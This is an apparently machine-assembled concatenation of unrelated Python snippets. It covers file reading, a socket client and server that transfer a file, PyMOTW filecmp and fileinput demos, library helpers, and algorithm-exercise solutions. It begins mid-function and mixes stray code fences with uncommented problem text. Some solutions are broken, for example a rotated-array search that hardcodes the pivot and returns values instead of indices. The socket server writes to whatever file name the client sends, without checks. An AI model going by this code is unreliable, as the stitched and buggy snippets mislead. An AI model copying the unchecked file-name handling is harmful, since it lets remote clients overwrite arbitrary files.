            name = "{}({})".format(name, k)
        new_file_names.append(name)
    return new_file_names

#!/usr/bin/env python

import sys

filename = sys.argv[1]

# These do not remove \n
with open(filename) as f:
    s = "".join(f.readlines())

with open(filename) as f:
    s = "".join(f)

with open(filename) as f:
    s = f.read()  # Fastest according to my tests.

# These remove \n
with open(filename) as f:
    s = " ".join(line.replace("\n", "") for line in f)

with open(filename) as f:
    s = " ".join(line.rstrip() for line in f)

with open(filename) as f:
    s = f.read().replace("\n", "")

import socket


def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.29.185"  # ip of the server
        port = 2110  # port no through which communication will take place
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating a socket
    except socket.error as msg:  # error message in case a socket can't be created
        print("Socket Creation Error:" + str(msg))


def socket_connect():
    global host
    global port
    global s
    s.connect((host, port))  # connecting to the socket


def send_receive():
    file = open("data.txt", "r")  # opening the file in read mode
    data = file.read()  # reading the data of the file
    s.send("data.txt".encode("utf-8"))  # encoding and sending the name of the file
    s.send(data.encode("utf-8"))  # encoding and sending the data of the file
    msg = s.recv(1024).decode(
        "utf-8"
    )  # receiving if the file has received by the server
    print("Response:" + msg)
    file.close()  # closing the file
    s.close()  # closing the socket


def main():
    create_socket()
    socket_connect()
    send_receive()


main()

import socket


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 2110  # port no through which communication will take place
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating a socket
    except socket.error as msg:
        print(
            "Socket Creation Error:" + str(msg)
        )  # error message in case a socket can't be created


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding with port:" + str(port))
        s.bind((host, port))  # to bind with the port
        s.listen(5)  # to listen to the client for information
    except socket.error as msg:  # error in case the socket could not be binded
        print("Socket Binding error:" + str(msg))
        print("Retrying.........")
        bind_socket()


def socket_accept():
    while True:
        clt_soc, add = s.accept()  # to accept the client socket and address
        # print the I/P and port no through which communication has been established
        print(
            "Connection has been established:IP......."
            + add[0]
            + " and Port:"
            + str(add[-1])
        )
        receive_file(clt_soc)  # function to receive the file
        clt_soc.close()  # to close the socket after communication


def receive_file(clt_soc):
    filename = clt_soc.recv(1024).decode("utf-8")  # to receive file name and decode it
    file = open(
        filename, "w"
    )  # to open a file with the received filename in write mode
    print(filename)  # to print the file name
    data = clt_soc.recv(1024).decode("utf-8")  # to receive the data of the file
    file.write(data)  # to write the contents of the file in the new file
    clt_soc.send(
        "File received.".encode("utf-8")
    )  # to send that file has been received
    file.close()  # to close the file


if __name__ == "__main__":
    create_socket()
    bind_socket()
    socket_accept()

#```


```pyCompare two files.```


```py

# end_pymotw_header
import filecmp

print("common_file    :", end=" ")
print(
    filecmp.cmp("example/dir1/common_file", "example/dir2/common_file", shallow=True),
    end=" ",
)
print(
    filecmp.cmp("example/dir1/common_file", "example/dir2/common_file", shallow=False)
)

print("contents_differ:", end=" ")
print(
    filecmp.cmp(
        "example/dir1/contents_differ", "example/dir2/contents_differ", shallow=True
    ),
    end=" ",
)
print(
    filecmp.cmp(
        "example/dir1/contents_differ", "example/dir2/contents_differ", shallow=False
    )
)

print("identical      :", end=" ")
print(
    filecmp.cmp(
        "example/dir1/file_only_in_dir1", "example/dir1/file_only_in_dir1", shallow=True
    ),
    end=" ",
)
print(
    filecmp.cmp(
        "example/dir1/file_only_in_dir1",
        "example/dir1/file_only_in_dir1",
        shallow=False,
    )
)

#```


```pyCompare files in two directories.```


```py

# end_pymotw_header
import filecmp
import os

# Determine the items that exist in both directories
d1_contents = set(os.listdir("example/dir1"))
d2_contents = set(os.listdir("example/dir2"))
common = list(d1_contents & d2_contents)
common_files = [f for f in common if os.path.isfile(os.path.join("example/dir1", f))]
print("Common files:", common_files)

# Compare the directories
match, mismatch, errors = filecmp.cmpfiles("example/dir1", "example/dir2", common_files)
print("Match       :", match)
print("Mismatch    :", mismatch)
print("Errors      :", errors)

```









---


```py


# end_pymotw_header
import filecmp
import pprint

dc = filecmp.dircmp("example/dir1", "example/dir2")
print("Common:")
pprint.pprint(dc.common)

print("\nDirectories:")
pprint.pprint(dc.common_dirs)

print("\nFiles:")
pprint.pprint(dc.common_files)

print("\nFunny:")
pprint.pprint(dc.common_funny)

```









---


```py


# end_pymotw_header
import filecmp

dc = filecmp.dircmp("example/dir1", "example/dir2")
print("Same      :", dc.same_files)
print("Different :", dc.diff_files)
print("Funny     :", dc.funny_files)

```









---


```py


# end_pymotw_header
import filecmp
import pprint

dc = filecmp.dircmp("example/dir1", "example/dir2")
print("Left:")
pprint.pprint(dc.left_list)

print("\nRight:")
pprint.pprint(dc.right_list)

```









---


```py


# end_pymotw_header
import filecmp
import pprint

dc = filecmp.dircmp("example/dir1", "example/dir2", ignore=["common_file"])

print("Left:")
pprint.pprint(dc.left_list)

print("\nRight:")
pprint.pprint(dc.right_list)

```









---


```py


# end_pymotw_header
import filecmp
import pprint

dc = filecmp.dircmp("example/dir1", "example/dir2")
print("Common:")
pprint.pprint(dc.common)

print("\nLeft:")
pprint.pprint(dc.left_only)

print("\nRight:")
pprint.pprint(dc.right_only)

```









---


```py


# end_pymotw_header
import filecmp

dc = filecmp.dircmp("example/dir1", "example/dir2")
dc.report_full_closure()

```









---


```py


# end_pymotw_header
import filecmp

dc = filecmp.dircmp("example/dir1", "example/dir2")
print("Subdirectories:")
print(dc.subdirs)

#```


```pyThis script creates the example directory and its contents.```


```py

# end_pymotw_header
import os


def mkfile(filename, body=None):
    with open(filename, "w") as f:
        f.write(body or filename)
    return


def make_example_dir(top):
    if not os.path.exists(top):
        os.mkdir(top)
    curdir = os.getcwd()
    os.chdir(top)

    os.mkdir("dir1")
    os.mkdir("dir2")

    mkfile("dir1/file_only_in_dir1")
    mkfile("dir2/file_only_in_dir2")

    os.mkdir("dir1/dir_only_in_dir1")
    os.mkdir("dir2/dir_only_in_dir2")

    os.mkdir("dir1/common_dir")
    os.mkdir("dir2/common_dir")

    mkfile("dir1/common_file", "this file is the same")
    os.link("dir1/common_file", "dir2/common_file")

    mkfile("dir1/contents_differ")
    mkfile("dir2/contents_differ")
    # Update the access and modification times so most of the stat
    # results will match.
    st = os.stat("dir1/contents_differ")
    os.utime("dir2/contents_differ", (st.st_atime, st.st_mtime))

    mkfile("dir1/file_in_dir1", "This is a file in dir1")
    os.mkdir("dir2/file_in_dir1")

    os.chdir(curdir)
    return


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__) or os.getcwd())
    make_example_dir("example")
    make_example_dir("example/dir1/common_dir")
    make_example_dir("example/dir2/common_dir")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimplistic sed implementation```


```py

# end_pymotw_header
import fileinput
import sys

from_base = sys.argv[1]
to_base = sys.argv[2]
files = sys.argv[3:]

for line in fileinput.input(files, inplace=True):
    line = line.rstrip().replace(from_base, to_base)
    print(line)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimplistic sed implementation```


```py

# end_pymotw_header
import fileinput
import glob
import sys

from_base = sys.argv[1]
to_base = sys.argv[2]
files = sys.argv[3:]

for line in fileinput.input(files, inplace=True):
    if fileinput.isfirstline():
        sys.stderr.write("Started processing {}\n".format(fileinput.filename()))
        sys.stderr.write("Directory contains: {}\n".format(glob.glob("etc_hosts.txt*")))
    line = line.rstrip().replace(from_base, to_base)
    print(line)

sys.stderr.write("Finished processing\n")
sys.stderr.write("Directory contains: {}\n".format(glob.glob("etc_hosts.txt*")))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExample for fileinput module.```


```py

# end_pymotw_header
import fileinput
import sys
import time
from xml.etree.ElementTree import Element, SubElement, tostring
from xml.dom import minidom

# Establish the RSS and channel nodes
rss = Element("rss", {"xmlns:dc": "http://purl.org/dc/elements/1.1/", "version": "2.0"})
channel = SubElement(rss, "channel")
title = SubElement(channel, "title")
title.text = "Sample podcast feed"
desc = SubElement(channel, "description")
desc.text = "Generated for PyMOTW"
pubdate = SubElement(channel, "pubDate")
pubdate.text = time.asctime()
gen = SubElement(channel, "generator")
gen.text = "https://pymotw.com/"

for line in fileinput.input(sys.argv[1:]):
    mp3filename = line.strip()
    if not mp3filename or mp3filename.startswith("#"):
        continue
    item = SubElement(rss, "item")
    title = SubElement(item, "title")
    title.text = mp3filename
    encl = SubElement(item, "enclosure", {"type": "audio/mpeg", "url": mp3filename})

rough_string = tostring(rss)
reparsed = minidom.parseString(rough_string)
print(reparsed.toprettyxml(indent="  "))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimplistic grep implementation```


```py

# end_pymotw_header
import fileinput
import re
import sys

pattern = re.compile(sys.argv[1])

for line in fileinput.input(sys.argv[2:]):
    if pattern.search(line):
        if fileinput.isstdin():
            fmt = "{lineno}:{line}"
        else:
            fmt = "{filename}:{lineno}:{line}"
        print(
            fmt.format(
                filename=fileinput.filename(),
                lineno=fileinput.filelineno(),
                line=line.rstrip(),
            )
        )

# Use open to open file "foo.txt" for reading
file = open("foo.txt", "r")
# Print all the lines in the file
print(file.read())
# Close the file
file.close()

# Use open to open file "bar.txt" for writing
file = open("bar.txt", "w")
# Use the write() method to write three lines to the file
lines = [
    "number one, the larch, the larch\n",
    "number two, the larch, the larch\n",
    "number three, the larch, the larch\n",
]

for line in lines:
    file.write(line)

# Close the file
file.close()

# Reading files

# Enter file name which is in same directory as that of the program
fileName = str(input("File name : "))
fileToRead = open(fileName, "r")  # 'r' reads the file
print(fileToRead.read())  # reading file
fileToRead.close()  # closing the file
````

`pyFiletype information.`

````py

from typing import Tuple

from pip._internal.utils.misc import splitext

WHEEL_EXTENSION = ".whl"
BZ2_EXTENSIONS = (".tar.bz2", ".tbz")  # type: Tuple[str, ...]
XZ_EXTENSIONS = (
    ".tar.xz",
    ".txz",
    ".tlz",
    ".tar.lz",
    ".tar.lzma",
)  # type: Tuple[str, ...]
ZIP_EXTENSIONS = (".zip", WHEEL_EXTENSION)  # type: Tuple[str, ...]
TAR_EXTENSIONS = (".tar.gz", ".tgz", ".tar")  # type: Tuple[str, ...]
ARCHIVE_EXTENSIONS = ZIP_EXTENSIONS + BZ2_EXTENSIONS + TAR_EXTENSIONS + XZ_EXTENSIONS


def is_archive_file(name):
    # type: (str) -> bool
    """Return True if `name` is a considered as an archive file."""
    ext = splitext(name)[1].lower()
    if ext in ARCHIVE_EXTENSIONS:
        return True
    return False

#!/usr/bin/env python3```


```pyA pandoc filter used in converting notebooks to Latex.
Converts links between notebooks to Latex cross-references.```


```py
import re

from pandocfilters import RawInline, applyJSONFilters, stringify


def resolve_references(source):
    """
    This applies the resolve_one_reference to the text passed in via the source argument.

    This expects content in the form of a string encoded JSON object as represented
    internally in ``pandoc``.
    """
    return applyJSONFilters([resolve_one_reference], source)


def resolve_one_reference(key, val, fmt, meta):
    """
    This takes a tuple of arguments that are compatible with ``pandocfilters.walk()`` that
    allows identifying hyperlinks in the document and transforms them into valid LaTeX
    \\hyperref{} calls so that linking to headers between cells is possible.

    See the documentation in ``pandocfilters.walk()`` for further information on the meaning
    and specification of ``key``, ``val``, ``fmt``, and ``meta``.
    """

    if key == "Link":
        text = stringify(val[1])
        target = val[2][0]
        m = re.match(r"#(.+)$", target)
        if m:
            # pandoc automatically makes labels for headings.
            label = m.group(1).lower()
            label = re.sub(r"[^\w-]+", "", label)  # Strip HTML entities
            return RawInline(
                "tex", r"\hyperref[{label}]{{{text}}}".format(label=label, text=text)
            )

    # Other elements will be returned unchanged.
````

````py
Commonly useful filters for `attr.asdict`.```


```py

from __future__ import absolute_import, division, print_function

from ._compat import isclass
from ._make import Attribute


def _split_what(what):
    """
    Returns a tuple of `frozenset`s of classes and attributes.
    """
    return (
        frozenset(cls for cls in what if isclass(cls)),
        frozenset(cls for cls in what if isinstance(cls, Attribute)),
    )


def include(*what):
    """
    Whitelist *what*.

    :param what: What to whitelist.
    :type what: `list` of `type` or `attr.Attribute`\\ s

    :rtype: `callable`
    """
    cls, attrs = _split_what(what)

    def include_(attribute, value):
        return value.__class__ in cls or attribute in attrs

    return include_


def exclude(*what):
    """
    Blacklist *what*.

    :param what: What to blacklist.
    :type what: `list` of classes or `attr.Attribute`\\ s.

    :rtype: `callable`
    """
    cls, attrs = _split_what(what)

    def exclude_(attribute, value):
        return value.__class__ not in cls and attribute not in attrs

    return exclude_

import fnmatch
import os

# constants
PATH = "./"
PATTERN = "*.md"


def get_file_names(filepath, pattern):
    matches = []
    if os.path.exists(filepath):
        for root, dirnames, filenames in os.walk(filepath):
            for filename in fnmatch.filter(filenames, pattern):
                # matches.append(os.path.join(root, filename))  # full path
                matches.append(os.path.join(filename))  # just file name
        if matches:
            print("Found {} files:".format(len(matches)))
            output_files(matches)
        else:
            print("No files found.")
    else:
        print("Sorry that path does not exist. Try again.")


def output_files(list_of_files):
    for filename in list_of_files:
        print(filename)


if __name__ == "__main__":
    get_file_names(PATH, PATTERN)

#! /bin/python3
#
# Search for keywords in files reachable from current directory.


from sys import argv
from os.path import basename
import readline
from subprocess import run, PIPE


VERBOSE = False
INSENSITIVE = False


def help():
    print(f"Syntax: {basename(argv[0])} (-i|-v|-h)")
    print("\t-i:\tCase insensitive search.")
    print("\t-v:\tVerbose.")
    print("\t-h:\tHelp.")


def green(text):
    return "\33[32m" + text + "\33[0m"


def main():
    # configure extension
    ext = input("Extensions: [c|cpp] ")

    if ext == "":
        ext = "c|cpp"
    elif ext.startswith("[") and ext.endswith("]"):
        ext.strip("[]")
    elif ext.startswith("(") and ext.endswith(")"):
        ext.strip("()")

    r = run(
        [
            "find",
            ".",
            "-type",
            "f",
            "-regex",
            ".*/.*\\.\\(" + ext.replace("|", "\\|") + "\\)",
        ],
        stdout=PIPE,
    )
    r.check_returncode()

    if len(r.stdout) == 0:
        print(f"It seems that no file match extension '{ext}'")
        exit(1)

    # configure search string (format: bytes)
    search_str = input("Search string: ").encode("utf8")
    if INSENSITIVE:
        search_str = search_str.upper()

    print("Searching for '" + search_str.decode("utf8") + "' ...")

    for name in r.stdout.decode("utf8").strip("\n").split("\n"):
        name_shown = False
        for line in open(name, "rb").read().split(b"\n"):
            if search_str in ((INSENSITIVE and line.upper()) or line):
                if not name_shown or VERBOSE:
                    print(green(name))
                    name_shown = True
                run(["grep", "--color=always", search_str], input=line)


if __name__ == "__main__":
    if len(argv) > 1:
        for arg in argv[1:]:
            if arg == "-i":
                INSENSITIVE = True
            elif arg == "-v":
                VERBOSE = True
            elif arg == "-h":
                help()
                exit(0)
    main()
````

````pyfinds the missing element in the shuffled list"""


def difference_set(orig, shuffled):
    """finds the missing element using a set."""

    return set(orig).difference(set(shuffled)).pop()


def difference_iterative(orig, shuffled):
    """finds the missing element by iterating over the list"""

    for x in orig:
        if not x in shuffled:
            return x

# code```


```py
Given an input stream of N integers. The task is to insert these numbers into a new stream and find the median of the stream formed by each insertion of X to the new stream.

Input:
The first line of input contains an integer N denoting the number of elements in the stream. Then the next N lines contains integer x denoting the number to be inserted into the stream.
Output:
For each element added to the stream print the floor of the new median in a new line.

Constraints:
1 <= N <= 106
1 <= x <= 106

Example:
Input:
4
5
15
1
3
Output:
5
10
5
4```


```py
# Solution

import heapq


def balance(minh, maxh):
    while abs(len(minh) - len(maxh)) > 1:
        if len(minh) > len(maxh):
            heapq.heappush(maxh, -heapq.heappop(minh))
        else:
            heapq.heappush(minh, -heapq.heappop(maxh))


def main():
    N = int(input())
    i = int(input())
    minh = []
    maxh = [-i]
    print(i)
    for _ in range(N - 1):
        inp = int(input())
        if inp < (-1 * maxh[0]):
            heapq.heappush(maxh, -1 * inp)
        else:
            heapq.heappush(minh, inp)
        balance(minh, maxh)
        if len(minh) > len(maxh):
            print(minh[0])
        elif len(maxh) > len(minh):
            print(-maxh[0])
        else:
            print((minh[0] - maxh[0]) // 2)


main()

# You are given two strings, str_1 and str_2, where str_2 is generated by randomly shuffling str_1 and then adding one letter at a random position.

# Write a function that returns the letter that was added to str_2.

# Examples:

# csFindAddedLetter(str_1 = "bcde", str_2 = "bcdef") -> "f"
# csFindAddedLetter(str_1 = "", str_2 = "z") -> "z"
# csFindAddedLetter(str_1 = "b", str_2 = "bb") -> "b"
# csFindAddedLetter(str_1 = "bf", str_2 = "bfb") -> "b"
# Notes:

# str_1 and str_2 both consist of only lowercase alpha characters.
# [execution time limit] 4 seconds (py3)

# [input] string str_1

# [input] string str_2

# [output] string


def csFindAddedLetter(str_1, str_2):
    m1 = {}
    for i in str_2:
        if i in m1:
            m1[i] += 1
        else:
            m1[i] = 1

    for i in str_1:
        m1[i] -= 1
    for h1 in m1:
        if m1[h1] == 1:
            return h1

# function to find lcm of two numbers
def findLcm(i, v):
    if i > v:
        x = i
    else:
        x = v
    while True:
        if (x % i == 0) and (x % v == 0):
            lcm = x
            return x
            break
        x = x + 1


# Main code
while True:
    startOrEnd = str(input("Count lcm or End : "))
    if startOrEnd == "Count lcm":
        getFirst = float(input("First num : "))
        getSecond = float(input("Second num : "))
        print(findLcm(getFirst, getSecond))
    else:
        quit()

def findAdjacentCells(i, j, n, m):
    l = []

    if i > 0:
        l += [(i - 1, j)]

    if i < (n - 1):
        l += [(i + 1, j)]

    if j > 0:
        l += [(i, j - 1)]

    if j < m - 1:
        l += [(i, j + 1)]

    return l


def findPath(matrix):

    starti = -1
    startj = -1

    found = False
    for i in range(len(matrix)):
        if found:
            break
        for j in range(len(matrix[0])):
            if matrix[i][j] == 1:
                starti, startj = i, j
                found = True
                break

    valid = True

    n = len(matrix)
    m = len(matrix[0])

    for i in range(1, n * m):
        l = findAdjacentCells(starti, startj, n, m)
        print(l)

        found_next = False
        for x, y in l:
            if matrix[x][y] == i + 1:
                found_next = True
                starti, startj = x, y
                break

        if not found_next:
            valid = False
            break

    return valid

def findProfession(level, pos):
    # Base case
    if level == 1:
        return "Engineer"

    # Recursively find parent's profession. If parent
    # is a doctar, this node will be a doctal if it is
    # at odd position and an engineer if at even position
    if findProfession(level - 1, (pos + 1) // 2) == "Doctor":
        if pos % 2:
            return "Doctor"
        else:
            return "Engineer"

    # If parent is an engineer, then current node will be
    # an enginner if at add position and doctor if even
    # position.
    if pos % 2:
        return "Engineer"
    else:
        return "Doctor"

You are given a non-empty array of integers.

One element appears exactly once, with every other element appearing at least twice, perhaps more.

# Write a function that can find and return the element that appears exactly once.

# Example 1:

# Input: [1,1,2,1]
# Output: 2
# Example 2:

# Input: [1,2,1,2,1,2,80]
# Output: 80
# Note: You should be able to develop a solution that has O(n) time complexity.

# [execution time limit] 4 seconds (py3)

# [input] array.integer nums

# [output] integer

from collections import Counter
def csFindTheSingleNumber(nums):
    frequency = Counter(nums)
    for i in frequency:
        if frequency[i] == 1:
            return i

# You are given a sorted array in ascending order that is rotated at some unknown pivot (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]) and a target value.

# Write a function that returns the target value's index. If the target value is not present in the array, return -1.

# You may assume no duplicate exists in the array.

# Your algorithm's runtime complexity must be in the order of O(log n).

# Example 1:

# Input: nums = [4,5,6,7,0,1,2], target = 0
# Output: 4

# Example 2:

# Input: nums = [4,5,6,7,0,1,2], target = 3
# Output: -1

# [execution time limit] 4 seconds (py3)

# [input] array.integer nums

# [input] integer target

# [output] integer


def binarySearch(arr, key):
    min = 0
    max = len(arr) - 1
    while not max < min:
        guess = (max + min) // 2

        if key == arr[guess]:
            return arr[guess]
        elif key > arr[guess]:
            min = guess + 1
        else:
            max = guess - 1
    return -1


def findValueSortedShiftedArray(nums, target):
    pivot = 3
    if nums[pivot] == target:
        return pivot
    if nums[pivot] >= target:
        value = binarySearch(nums[pivot + 1 :], target)
        print(value)
        if value == target:
            return nums.index(value)

# You are given a sorted array in ascending order that is rotated at some unknown pivot (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]) and a target value.
#
# Write a function that returns the target value's index. If the target value is not present in the array, return -1.
#
# You may assume no duplicate exists in the array.
#
# Your algorithm's runtime complexity must be in the order of O(log n).
#
# Example 1:
#
# Input: nums = [4,5,6,7,0,1,2], target = 0
# Output: 4
#
# Example 2:
#
# Input: nums = [4,5,6,7,0,1,2], target = 3
# Output: -1
#
# [execution time limit] 4 seconds (py3)
#
# [input] array.integer nums
#
# [input] integer target
#
# [output] integer
````

````py
Find the Busiest Interval

Given a list of arriving time and leaving time for each celebrity.
Celebrity I, arrives at arriving[I] time and leaves at leaving[I] time.
Output is the time interval that you want to go the party when the maximum number of celebrities are still there.

Input: arriving=[30, 0, 60], leaving=[75, 50, 150]
Output: (30, 50) or (60, 75)

=========================================
Just sort the lists, don't care about pairs ordering.
And use a counter, when arriving counter++, when leaving counter--.
    Time Complexity:    O(N LogN)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def bussiest_interval(arriving, leaving):
    # sort both arrays (don't care about pairs)
    arriving.sort()
    leaving.sort()

    n = len(arriving)
    i, j = 0, 0
    start, end = 0, 0
    overlapping = 0
    max_overlapping = 0

    # both arrays have same number of elements
    # but the biggest time is from the leaving array
    # becayse of that you're sure that 'i' will reach the end before 'j'
    while i < n:
        if arriving[i] <= leaving[j]:
            overlapping += 1
            if max_overlapping <= overlapping:
                max_overlapping = overlapping
                # save the start time if max_overlapping
                start = arriving[i]
            i += 1
        else:
            if max_overlapping == overlapping:
                # save the exit time if max_overlapping
                end = leaving[j]
            overlapping -= 1
            j += 1

    # check again this to close the result interval because 'i' is completed and not 'j'
    if max_overlapping == overlapping:
        end = leaving[j]

    # return start&end or max_overlapping
    return (start, end)


###########
# Testing #
###########

# Test 1
# Correct result => (30, 50) or (60, 75)
print(bussiest_interval([30, 0, 60], [75, 50, 150]))

# Test 2
# Correct result => (5, 5)
print(bussiest_interval([1, 2, 10, 5, 5], [4, 5, 12, 9, 12]))

# This method is called exhaustive numeration!
# I am checking every possible value
# that can be root of given x systematically
# Kinda brute forcing


def find_cube_root(x):
    if type(x) == str:
        return "Expected an integer! Cannot find cube root of an string!"
    for i in range(0, x):
        if i ** 3 == x:
            return i
    return "{} is not a perfect cube".format(x)


# Test
x = 27
result = find_cube_root(x)
print("Cube root of {} is {}".format(x, result))
````

````py
Find the element before which all the elements are smaller than it, and after which all are greater

Given an array, find an element before which all elements are smaller than it, and after which all are greater than it.
Return the index of the element if there is such an element, otherwise, return -1.

Input: [5, 1, 4, 3, 6, 8, 10, 7, 9]
Output: 4

=========================================
Traverse the array starting from left and find all max elements till that element.
Also traverse the array starting from right and find all min elements till that element.
In the end only compare mins and maxs with the curent element.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############

import math


def find_element_smaller_left_bigger_right(arr):
    n = len(arr)
    left_maxs = [-math.inf]
    right_min = math.inf

    # find all mins from the front
    for i in range(n - 1):
        left_maxs.append(max(left_maxs[-1], arr[i]))

    for i in range(n - 1, -1, -1):
        # check if all left are smaller
        # and all right are bigger
        if (left_maxs[i] < arr[i]) and (right_min > arr[i]):
            return i

        # don't need a separate for loop for this as mins
        right_min = min(right_min, arr[i])

    return -1


###########
# Testing #
###########

# Test 1
# Correct result => 4
print(find_element_smaller_left_bigger_right([5, 1, 4, 3, 6, 8, 10, 7, 9]))

# Test 2
# Correct result => -1
print(find_element_smaller_left_bigger_right([5, 1, 4, 4]))
````

````py
Find an Element Which is Smaller or Equal to Exactly K Numbers

You have to find some number X greater than 0 where exactly K elements in that list are greater than or equal to the number X.
If there are multiple such values return the smallest possible.
If there is no such X, return (-1).

Input: [3,8,5,1,10,3,20,24], 2
Output: 11
Output explanation: Only 20 and 24 are greater or smaller from 11 (11 is the smallest solution, also 12, 13...20 are solutions).

=========================================
Sort the array and check the Kth element from the end.
    Time Complexity:    O(NLogN)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def get_minimum_X(arr, k):
    n = len(arr)

    if n == 0 or k > n:
        return -1

    if k == n:
        return 1

    arr.sort()

    if k == 0:
        return arr[-1] + 1

    if arr[-k] == arr[-(k + 1)]:
        return -1

    return arr[-(k + 1)] + 1


###########
# Testing #
###########

# Test 1
# Correct result => 11
print(get_minimum_X([3, 8, 5, 1, 10, 3, 20, 24], 2))
````

````py
Find First and Last Position of Element in Sorted Array

Given an array of integers nums sorted in ascending order,
find the starting and ending position of a given target value.
If the target is not found in the array, return [-1, -1].

Input: [5, 7, 7, 8, 8, 10], 8
Output: [3, 4]

Input: [5, 7, 7, 8, 8, 10], 6
Output: [-1, -1]

=========================================
Use binary search twice to find the range.
    Time Complexity:    O(LogN)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def search_range(nums, target):
    left_idx = binary_search(nums, target, True)
    if (left_idx == len(nums)) or (nums[left_idx] != target):
        return [-1, -1]

    right_idx = binary_search(nums, target, False) - 1
    return [left_idx, right_idx]


def binary_search(nums, target, equal=True):
    left = 0
    right = len(nums)

    while left < right:
        mid = (left + right) // 2

        if (nums[mid] > target) or (equal and nums[mid] == target):
            right = mid
        else:
            left = mid + 1

    return left


###########
# Testing #
###########

# Test 1
# Correct result => [3, 4]
print(search_range([5, 7, 7, 8, 8, 10], 8))

# Test 2
# Correct result => [-1, -1]
print(search_range([5, 7, 7, 8, 8, 10], 6))

# NguyenU


def find_max(nums):
    """
    >>> for nums in ([3, 2, 1], [-3, -2, -1], [3, -3, 0], [3.0, 3.1, 2.9]):
    ...     find_max(nums) == max(nums)
    True
    True
    True
    True
    """
    max_num = nums[0]
    for x in nums:
        if x > max_num:
            max_num = x
    return max_num


def main():
    print(find_max([2, 4, 9, 7, 19, 94, 5]))  # 94


if __name__ == "__main__":
    main()
````

````py
Find max branch sum

Wrie a function that takes a binary tree and returns its max branch (branch is "root to leaf path") sum.

Input:
        1
       / \
      2   3
     / \ / \
    4  5 6  7
Output: 11
Output explanation: 1 -> 3 -> 7

=========================================
Traverse the tree and in each node compare the left and right subbranch sum, and take the bigger one.
    Time Complexity:    O(N)
    Space Complexity:   O(N)        , because of the recursion stack (but this is the tree is one branch), O(LogN) if the tree is balanced.```


```py


############
# Solution #
############

# import TreeNode class from tree_helpers.py
from tree_helpers import TreeNode


def max_branch_sum(node):
    if node is None:
        return 0

    # take the max left subbranch sum and add the current node value
    left_max_sum = max_branch_sum(node.left) + node.val
    # take the max right subbranch sum and add the current node value
    right_max_sum = max_branch_sum(node.right) + node.val

    # return the bigger sum
    return max(left_max_sum, right_max_sum)


###########
# Testing #
###########

# Test 1
# Correct result => 11
tree = TreeNode(
    1, TreeNode(2, TreeNode(4), TreeNode(5)), TreeNode(3, TreeNode(6), TreeNode(7))
)
print(max_branch_sum(tree))

# Divide and Conquer algorithm
def find_max(nums, left, right):
    """
    find max value in list
    :param nums: contains elements
    :param left: index of first element
    :param right: index of last element
    :return: max in nums

    >>> nums = [1, 3, 5, 7, 9, 2, 4, 6, 8, 10]
    >>> find_max(nums, 0, len(nums) - 1) == max(nums)
    True
    """
    if left == right:
        return nums[left]
    mid = (left + right) >> 1  # the middle
    left_max = find_max(nums, left, mid)  # find max in range[left, mid]
    right_max = find_max(nums, mid + 1, right)  # find max in range[mid + 1, right]

    return left_max if left_max >= right_max else right_max


if __name__ == "__main__":
    nums = [1, 3, 5, 7, 9, 2, 4, 6, 8, 10]
    assert find_max(nums, 0, len(nums) - 1) == 10

def find_min(nums):
    """
    Find Minimum Number in a List
    :param nums: contains elements
    :return: min number in list

    >>> for nums in ([3, 2, 1], [-3, -2, -1], [3, -3, 0], [3.0, 3.1, 2.9]):
    ...     find_min(nums) == min(nums)
    True
    True
    True
    True
    """
    min_num = nums[0]
    for num in nums:
        if min_num > num:
            min_num = num
    return min_num


def main():
    assert find_min([0, 1, 2, 3, 4, 5, -3, 24, -56]) == -56


if __name__ == "__main__":
    main()

# Divide and Conquer algorithm
def find_min(nums, left, right):
    """
    find min value in list
    :param nums: contains elements
    :param left: index of first element
    :param right: index of last element
    :return: min in nums

    >>> nums = [1, 3, 5, 7, 9, 2, 4, 6, 8, 10]
    >>> find_min(nums, 0, len(nums) - 1) == min(nums)
    True
    """
    if left == right:
        return nums[left]
    mid = (left + right) >> 1  # the middle
    left_min = find_min(nums, left, mid)  # find min in range[left, mid]
    right_min = find_min(nums, mid + 1, right)  # find min in range[mid + 1, right]

    return left_min if left_min <= right_min else right_min


if __name__ == "__main__":
    nums = [1, 3, 5, 7, 9, 2, 4, 6, 8, 10]
    assert find_min(nums, 0, len(nums) - 1) == 1
````

````py
Find the missing number in a sequence

Find the only missing integer in a sequence,
all numbers are integers and they're smaller or equal to N+1 (N is length of the array).

Input: [2, 1, 4]
Output: 3

=========================================
Searching for 1 unknown, math problem.
Use the sum formula for the first N numbers to compute the whole sum of the sequence.
After that sum all elements from the array, and when you subtract those 2 numbers, you'll get the missing number.
Sum formula = N*(N+1)/2
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py

############
# Solution #
############


def missing_number(nums):
    s = sum(nums)
    n = len(nums) + 1
    # sum formula (sum of the first n numbers) = (N*(N+1))/2
    return n * (n + 1) // 2 - s


###########
# Testing #
###########

# Test 1
# Correct result => 4
print(missing_number([2, 3, 1]))

# Test 2
# Correct result => 3
print(missing_number([2, 1, 4]))
````

````py
Find pairs with sum K

Given an array, find all pairs which sum is equal to K.

Input: [1, 2, 3, 4, 5, 5, 6, 7, 8, 9], 5
Output: [(1, 9), (2, 8), (3, 7), (4, 6), (5, 5)]

=========================================
Save numbers as complements in a hashset and for each number search for the pair complement (K-number).
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def find_pairs(arr, K):
    # set to save all complements
    complements = set()
    # set to save all unique complements that form a pair
    pair_complements = set()

    for el in arr:
        c = K - el

        # if complement exists, then a pair is found
        if c in complements:
            pair_complements.add(c)

        # save this number as complement
        complements.add(el)

    # find all unique pairs
    pairs = []
    for c in pair_complements:
